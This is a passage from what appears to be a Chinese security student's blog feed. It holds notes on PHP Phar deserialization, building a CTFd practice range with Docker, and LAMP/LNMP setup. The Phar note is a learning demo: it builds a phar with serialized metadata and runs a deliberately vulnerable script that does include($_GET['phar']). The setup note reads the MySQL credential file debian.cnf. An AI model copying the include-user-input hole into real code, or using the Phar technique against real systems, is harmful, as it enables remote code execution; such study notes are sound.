      <url>/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入 unserialize() ，随着代码安全性越来越高，利用难度也越来越大。但是利用 phar 文件会以反序列化的形式存储用户自定义的 meta-data 这一特征，拓展了 php 反序列化漏洞的攻击面。该方法在文件系统函数(file_exists()、is_dir()等)参数可控的情况下，配合 <code>phar://</code> 协议，可以不依赖 unserialize() 直接进行反序列化操作。</p><h1 id="Phar反序列化漏洞的原理"><a href="#Phar反序列化漏洞的原理" class="headerlink" title="Phar反序列化漏洞的原理"></a>Phar反序列化漏洞的原理</h1><h2 id="什么是Phar？"><a href="#什么是Phar？" class="headerlink" title="什么是Phar？"></a>什么是Phar？</h2><p>Phar(“Php ARchive”) 是PHP 里类似于 JAR 的一种打包文件，在 PHP 5.3 或更高版本中默认开启，这个特征使得 PHP 也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打包一个Phar 包， 直接放到 <code>PHP-FPM</code> 中运行。</p><h2 id="PHP内置的流包装器"><a href="#PHP内置的流包装器" class="headerlink" title="PHP内置的流包装器"></a>PHP内置的流包装器</h2><p>php 通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数。如(fopen(),copy(),file_exists()和filesize())。 <code>phar://</code>就是一种内置的流包装器</p><blockquote><p>file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器<br>http:// — 访问 HTTP(s) 网址<br>ftp:// — 访问 FTP(s) URLs<br>php:// — 访问各个输入/输出流（I/O streams）<br>zlib:// — 压缩流<br>data:// — 数据（RFC 2397）<br>glob:// — 查找匹配的文件路径模式<br>phar:// — PHP 归档<br>ssh2:// — Secure Shell 2<br>rar:// — RAR<br>ogg:// — 音频流<br>expect:// — 处理交互式的流</p></blockquote><p><a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和包装器</a></p><h2 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h2><ol><li>a stub</li></ol><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面的xxx内容不限，但必须是以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><ol start="2"><li>a manifest describing the contents、</li></ol><p>Phar文件中被压缩的文件的一些信息，其中<code>Meta-data</code>部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p><p><img src="E:\Typora\images\24388aaa-6ea4-4856-8fb1-fbf29deb5dca.png-w331s"></p><ol start="3"><li>the file contents</li></ol><p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p><ol start="4"><li> a signature for verifying Phar integrity</li></ol><p>签名，放在文件末尾，格式如下：</p><p><img src="E:\Typora\images\f87194d9-81d6-4786-9339-8a7d4ac596d5.png-w331s"></p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。</p><p>注意：要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p><p><code>phar_demo.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$o</span>-&gt;data = <span class="string">&#x27;seizer&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行代码后，会生成一个phar.phar的文件在当前目录下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">      Offset: <span class="number">00</span> <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> <span class="number">08</span> <span class="number">09</span> <span class="number">0</span>A <span class="number">0</span>B <span class="number">0</span>C <span class="number">0</span>D <span class="number">0</span>E <span class="number">0</span>F </span><br><span class="line"><span class="number">00000000</span>: <span class="number">3</span>C <span class="number">3</span>F <span class="number">70</span> <span class="number">68</span> <span class="number">70</span> <span class="number">20</span> <span class="number">5</span>F <span class="number">5</span>F <span class="number">48</span> <span class="number">41</span> <span class="number">4</span>C <span class="number">54</span> <span class="number">5</span>F <span class="number">43</span> <span class="number">4</span>F <span class="number">4</span>D    &lt;?php.__HALT_COM</span><br><span class="line"><span class="number">00000010</span>: <span class="number">50</span> <span class="number">49</span> <span class="number">4</span>C <span class="number">45</span> <span class="number">52</span> <span class="number">28</span> <span class="number">29</span> <span class="number">3</span>B <span class="number">20</span> <span class="number">3</span>F <span class="number">3</span>E <span class="number">0</span>D <span class="number">0</span>A <span class="number">64</span> <span class="number">00</span> <span class="number">00</span>    PILER();.?&gt;..d..</span><br><span class="line"><span class="number">00000020</span>: <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">2</span>E    ................</span><br><span class="line"><span class="number">00000030</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">4</span>F <span class="number">3</span>A <span class="number">31</span> <span class="number">30</span> <span class="number">3</span>A <span class="number">22</span> <span class="number">54</span> <span class="number">65</span> <span class="number">73</span> <span class="number">74</span> <span class="number">4</span>F <span class="number">62</span> <span class="number">6</span>A    ...O:<span class="number">10</span>:<span class="string">&quot;TestObj</span></span><br><span class="line"><span class="string">00000040: 65 63 74 22 3A 31 3A 7B 73 3A 34 3A 22 64 61 74    ect&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;dat</span></span><br><span class="line"><span class="string">00000050: 61 22 3B 73 3A 36 3A 22 73 65 69 7A 65 72 22 3B    a&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;seizer&quot;</span>;</span><br><span class="line"><span class="number">00000060</span>: <span class="number">7</span>D <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">74</span> <span class="number">65</span> <span class="number">73</span> <span class="number">74</span> <span class="number">2</span>E <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    &#125;....test.txt...</span><br><span class="line"><span class="number">00000070</span>: <span class="number">00</span> CE E8 <span class="number">66</span> <span class="number">61</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">7</span>E <span class="number">7</span>F D8 B6 <span class="number">01</span> <span class="number">00</span>    .Nhfa.....~.X6..</span><br><span class="line"><span class="number">00000080</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">74</span> <span class="number">65</span> <span class="number">73</span> <span class="number">74</span> A6 <span class="number">98</span> F8 F3 <span class="number">51</span> ED C0    .....test&amp;.xsQm@</span><br><span class="line"><span class="number">00000090</span>: FE <span class="number">94</span> <span class="number">7</span>A E7 FC <span class="number">1</span>A <span class="number">77</span> <span class="number">1</span>D <span class="number">83</span> <span class="number">52</span> <span class="number">78</span> FD B0 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>    ~.zg|.w..Rx&#125;<span class="number">0.</span>..</span><br><span class="line"><span class="number">000000</span>a0: <span class="number">00</span> <span class="number">47</span> <span class="number">42</span> <span class="number">4</span>D <span class="number">42</span>                                     .GBMB</span><br></pre></td></tr></table></figure><p>可以明显的看到meta-data是以序列化的形式存储的。<br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="E:\Typora\images\1937992-20200602120704676-1021025129.png"></p><p><code>phar_fan.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; data;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phar&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功触发反序列化</p><p><img src="E:\Typora\images\image-20211013221751010.png" alt="image-20211013221751010"></p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">phar反序列化</a></p><p><a href="https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Phar反序列化总结</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfd靶场搭建过程</title>
      <link href="/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/"/>
      <url>/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker为何物？"><a href="#Docker为何物？" class="headerlink" title="Docker为何物？"></a>Docker为何物？</h1><ul><li><p>官方是这样说的：Docker是一个开源的应用容器引擎，Docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的Linux继器上，也可以实现虚拟化。</p></li><li><p>在我理解其实就是轻量级的虚拟机，它没有了那好看的图形管理系统等甚至只需要一个服务就可以实现虚拟化！</p></li></ul><h2 id="镜像和容器"><a href="#镜像和容器" class="headerlink" title="镜像和容器"></a>镜像和容器</h2><ul><li>镜像和容器的关系就好比是类和对象，容器只是镜像的一个实例化对象，Docker镜像是用于创捷Docker容器的模板。</li></ul><h1 id="如何使用docker呢？"><a href="#如何使用docker呢？" class="headerlink" title="如何使用docker呢？"></a>如何使用docker呢？</h1><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-ce</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure><blockquote><p>便于操作我们直接换root模式</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><blockquote><p>如果没有设置root密码请按照下面步骤</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改好密码之后再次进入</span></span><br><span class="line">su root</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559829.png" alt="image-20210715211155152"></p><h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure><blockquote><p>使用该镜像启动容器</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure><ul><li>启动后直接进入了该容器的终端</li></ul><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559831.png" alt="image-20210715211451858"></p><p>参数说明：</p><ul><li><strong>-i</strong>: 交互式操作。</li><li><strong>-t</strong>: 终端。</li><li><strong>ubuntu</strong>: ubuntu 镜像。</li><li><strong>/bin/bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。</li></ul><blockquote><p>此时已经在该容器的终端了</p></blockquote><h3 id="其他的命令"><a href="#其他的命令" class="headerlink" title="其他的命令"></a>其他的命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker images# 查看所有的镜像</span><br><span class="line">docker ps# 查看启动的容器</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559832.png" alt="image-20210715211315727"></p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559833.png" alt="image-20210715211357601"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a# 查看所有容器</span><br><span class="line">docker start 容器ID# 启动容器</span><br><span class="line">docker stop 容器ID# 停止容器</span><br><span class="line">dockers restart 容器ID# 重启容器</span><br><span class="line">docker rm 容器ID# 删除容器</span><br><span class="line">docker rmi 镜像name# 删除镜像</span><br><span class="line">docker attach 容器ID# 进入容器 （退出时会使容器停止）</span><br><span class="line">docker exec 容器ID# 进入容器 （退出时不会使容器停止）</span><br><span class="line">docker commit 容器ID # 根据容器的更改创建新镜像</span><br></pre></td></tr></table></figure><h1 id="使用docker和CTFd搭建靶场"><a href="#使用docker和CTFd搭建靶场" class="headerlink" title="使用docker和CTFd搭建靶场"></a>使用docker和CTFd搭建靶场</h1><ul><li>首先先把git下载下来</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt git</span><br></pre></td></tr></table></figure><ul><li>再下载CTFd</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/CTFd/CTFd.git</span><br></pre></td></tr></table></figure><ul><li>下载下来之后，</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd CTFd# 进入目录docker-compose up -d # 记得先拿root权限</span><br></pre></td></tr></table></figure><ul><li>经过耐心等待之后访问127.0.0.1发现CTFd已经部署好了，经过注册后如下：</li></ul><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559834.png" alt="image-20210715211618205"></p><blockquote><p>接下来我们使用docker容器搭建web应用程序，再使用端口映射将容器映射到不同端口上即可成功搭建靶场</p></blockquote><ul><li>For example:</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -it -p 2333:80 ubuntu# docker容器的80端口映射到主机的2333端口docker exec -it 容器ID /bin/bash# 进入终端后service apache2 status# 查看服务是否开启service apache2 start# 开启服务service apache2 stop# 关闭服务</span><br></pre></td></tr></table></figure><ul><li><strong>-P :<strong>是容器内部端口</strong>随机</strong>映射到主机的高端口。</li><li><strong>-p :</strong> 是容器内部端口绑定到<strong>指定</strong>的主机端口。</li></ul><h1 id="PuTTY远程SSH"><a href="#PuTTY远程SSH" class="headerlink" title="PuTTY远程SSH"></a>PuTTY远程SSH</h1><ul><li>今天把之前的Windows Server重置为了Ubuntu 20.04 LTS ，结果发现不能直接使用mstsc直接连接，只能远程SSH，突然感觉不香了</li></ul><blockquote><p>下载地址：<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></p></blockquote><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559835.png" alt="img"></p><ol><li>参数举例说明如下：<ul><li>Host Name（or IP address）：公网 IP</li><li>Port：轻量应用服务器的连接端口，必须设置为22</li><li>Connect type：选择 “SSH”</li><li>Saved Sessions：填写会话名称，例如 test<br>配置 “Host Name” 后，再配置 “Saved Sessions” 并保存，则后续使用时您可直接双击 “Saved Sessions” 下保存的会话名称即可登录服务器</li></ul></li><li>单击【Open】，进入 “PuTTY” 的运行界面</li></ol><ul><li>剩余操作都是一样的，最后成果</li></ul><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559836.png" alt="image-20210715211659628"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> DIY </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LAMP和LNMP环境搭建的艰辛历程</title>
      <link href="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/"/>
      <url>/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="LAMP环境的搭建"><a href="#LAMP环境的搭建" class="headerlink" title="LAMP环境的搭建"></a>LAMP环境的搭建</h1><blockquote><p>在图形管理化界面中依次打开系统设置、软件和更新。在下载自重选择其他站点，然后在中国的条目下选择mirrors.ustc.edu.cn。</p></blockquote><p>Ubuntu换源可参考<a href="https://mirrors.ustc.edu.cn/help/ubuntu.html">https://mirrors.ustc.edu.cn/help/ubuntu.html</a></p><blockquote><p>更新资源包:sudo apt update</p><p>更新软件:sudo apt upgrade</p><p>清除不需要的软件:sudo apt autoremove</p><p>清除不需要的文件:sudo apt autoclean</p></blockquote><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>接下来就可以进入正式搭建了</p><blockquote><p>su root                     //方便之后更快的操作，切换root用户</p><p>apt install apache2</p></blockquote><p>默认的配置文件:/etc/apache2/sites-enabled/000-default.conf</p><p>默认网站根目录:/var/www/html</p><p>安装完成之后<strong>检查apache是否开启</strong>:</p><blockquote><p>service apache2 status            // 查看apache是否开启</p></blockquote><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559990.png" alt="image-20210730172438646"></p><blockquote><p>service apache2 stop            // 关闭apache服务</p><p>service apache2 start            // 打开apache服务</p><p>service apache2 restart        //重启apache服务</p></blockquote><p>也可以查看80端口是否开启</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559991.png" alt="image-20210730172703746"></p><h3 id="安装apache遇到的问题"><a href="#安装apache遇到的问题" class="headerlink" title="安装apache遇到的问题"></a>安装apache遇到的问题</h3><p>安装过程中发现apache启动不了，使用</p><blockquote><p>systemctl status apache2         查看apache服务的状态</p></blockquote><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559992.png" alt="image-20210730173206831"></p><p>查阅资料和翻译英语得知是80端口被占用所以开启不了apache服务</p><blockquote><p>netstat -ntulp|grep 80    // 查看80端口</p></blockquote><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559993.png" alt="image-20210730173427993"></p><p>这我才发现是因为之前搭建靶场时docker容器占用了80端口，只要把容器停止就好了</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559994.png" alt="image-20210730173713326"></p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><blockquote><p>apt install mysql-server</p></blockquote><p>mysql的配置文件: /etc/mysql/mysql.conf.d/mysqld.cnf</p><h3 id="登录mysql的方法"><a href="#登录mysql的方法" class="headerlink" title="登录mysql的方法"></a>登录mysql的方法</h3><ol><li>cat /etc/mysql/debian.cnf查看默认用户的密码</li></ol><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559995.png" alt="image-20210730174354524"></p><blockquote><p>mysql -u debian-sys-maint -p</p></blockquote><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559996.png" alt="image-20210730174449794"></p><blockquote><p> 修改密码:</p><p>注：8.0以上版本 ‘password’ 字段已经不管用了，会报错，相关的命令比如：<code>update mysql.user set password=&#39;newpassword&#39; where user=&#39;root&#39;;</code>一同失效</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;你的密码&#x27;</span>;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><blockquote><p>Ctrl+Z退出mysql，重新运行，使用新密码登录，完成</p></blockquote><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote><p>apt install php7.4</p></blockquote><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559997.png" alt="image-20210730182358690"></p><p>测试php是否安装成功</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559998.png" alt="image-20210730182527561"></p><p>安装php组件：</p><blockquote><p>apt install apt install php-curlphp.cgi php-json</p></blockquote><p>php-curl：curl是一个库，能让你通过URL和许多不同种的服务器进行勾搭、搭讪和深入交流，并且还支持许多协议。并且人家还说了curl可以支持https认证、http post、ftp上传、代理、cookies、简单口令认证等等功能啦。</p><p>php.cgi:    cgi是 (common gateway interface)通用网关接口 .php-cgi是php提供给web serve也就是http前端服务器的cgi协议接口程序，当每次接到http前端服务器的请求都会开启一个php-cgi进程进行处理。</p><p>php-json: json 序列化相关操作</p><p>安装php扩展：</p><blockquote><p>apt install php-pear libapache2-mod-php php-mysql</p></blockquote><p>php-pear: Pear 是“PHP Extension and Application Repository”的缩写，即PHP扩展和应用仓库。Pear 将PHP程序开发过程中常用的功能编写成类库，涵盖了页面呈现、数据库访问、文件操作、数据结构、缓存操作、网络协议、WebService 等许多方面，用户可以通过下载这些类库并适当的作一些定制以实现自己需要的功能。避免重复发明“车轮”。Pear 的出现大大提高了PHP 程序的开发效率和开发质量。</p><p>libapache2-mod-php:我猜测应该是对apache php解析的一个增强</p><p>php-mysql: 关于php对数据库操作的函数</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559999.png" alt="image-20210730190357602"></p><h1 id="Lnmp环境的搭建"><a href="#Lnmp环境的搭建" class="headerlink" title="Lnmp环境的搭建"></a>Lnmp环境的搭建</h1><h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><blockquote><p>停止apache服务        service apache2 stop</p><p>安装nginx                    apt install nginx</p></blockquote><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559000.png" alt="image-20210730230840603"></p><h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h2><blockquote><p>apt install php7.4-fpm</p></blockquote><blockquote><p>vim /etc/nginx/sites-available/default</p></blockquote><p>在56行做如下修改</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559001.png" alt="image-20210730231157601"></p><blockquote><p>service nginx restart                // 重启服务即可</p></blockquote><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559002.png" alt="image-20210730231448845"></p><p>或者还可以这样</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559003.png" alt="image-20210730231007177"></p><p>然后这样</p><blockquote><p>vim /etc/php/7.4/fpm/pool.d/<a href="http://www.conf/">www.conf</a></p></blockquote><p>在37行加入下面这句话</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559004.png" alt="image-20210730231620847"></p><blockquote><p>service php7.4-fpm restart                //重启服务即可</p></blockquote><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559005.png" alt="image-20210730231747532"></p><h1 id="配置PHP环境中出现的一些问题"><a href="#配置PHP环境中出现的一些问题" class="headerlink" title="配置PHP环境中出现的一些问题"></a>配置PHP环境中出现的一些问题</h1><p>PHP运行目前为止主要的三种方式：</p><ol><li>以模块加载的方式运行——将PHP集成到Apache服务器，以同一个进程运行。</li><li>以CGI的方式运行——Apache在遇到PHP脚本的时候会将PHP程序提交给CGI应用程序（php-cgi.exe）解释，解释之后的结果返回给Apache，最后再返回给相应的请求用户。</li><li>以FastCGI的方式运行——CGI的加强版本，CGI是单进程，多线程的运行方式，程序执行完成之后就会销毁，所以每次都需要加载配置和环境变量fork-and-execute（创建-执行）。而FastCGI则不同，FastCGI像是一个常驻 (long-live) 型的CGI，只要激活后，在web服务器启动时就开启了一个进程，它可以一直执行着，不会每次都要花费时间去fork一个进程(CGI最为人诟病的fork-and-execute模式)。</li></ol><h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><blockquote><p> CGI(Common Gateway Interface)公共网关接口是HTTP服务器与机器上的程序进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。</p><p>工作原理：CGI程序根据请求提交的参数作相应处理，然后输出标准的html语句返回给web server，web server再返回给客户端。</p></blockquote><p>简单的说：cgi就是专门用来和web 服务器打交道的。web服务器收到用户请求，就会把请求提交给cgi程序(php的fastcgi），cgi程序根据请求提交的参数作应处理（解析php），然后输出标准的html语句返回给web服务器，再返回给客户端，这就是普通cgi的工作原理。</p><h2 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h2><blockquote><p> FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次(这是CGI最为人诟病的fork-and-execute 模式)。它还支持分布式的运算, 即 FastCGI 程序可以在网站服务器以外的主机上执行并且接受来自其它网站服务器来的请求。</p></blockquote><p>传统的cgi协议在每次连接请求时，会开启一个进程进行处理，处理完毕会关闭该进程，因此下次连接，又要再次开启一个进程进行处理，因此有多少个连接就有多少个cgi进程，这也就是为什么传统的cgi会显得缓慢的原因，因此过多的进程会消耗资源和内存。而fast-cgi则是一个进程可以处理多个请求（这里的意思不是说一个进程可以同时处理多个请求，二十因为fastcgi是常驻cgi，不需要花费时间去fork进程），和上面的cgi协议完全不一样，cgi是一个进程只能处理一个请求，这样就会导致大量的cgi程序，因此会给服务器带来负担。</p><p>FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。</p><p><strong>工作原理</strong></p><ol><li>Web Server启动时载入FastCGI进程管理器（IIS ISAPI或Apache Module)</li><li>FastCGI进程管理器自身初始化，启动多个CGI解释器进程(在任务管理器中可见多个php-cgi.exe)并等待来自WebServer的连接,FastCGI使用tcp方式通信。</li><li>当客户端请求到达Web 